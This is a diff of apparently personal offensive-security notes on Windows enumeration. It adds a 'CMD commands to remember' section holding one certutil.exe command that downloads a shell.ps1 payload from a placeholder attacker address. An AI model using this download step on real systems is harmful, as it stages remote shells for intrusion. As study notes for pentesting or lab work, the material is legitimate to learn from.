@@ -53,3 +53,11 @@ A good flag to use is `-Properties` with these, which takes a comma-separated li
 It has the drawback of being quite noisy though.
 
 
+
+## CMD commands to remember
+
+CMD equivalent of wget
+```
+certutil.exe -urlcache -split -f http://{ATTACKER_IP}:{ATTACKER_PORT}/shell.ps1
+```
+
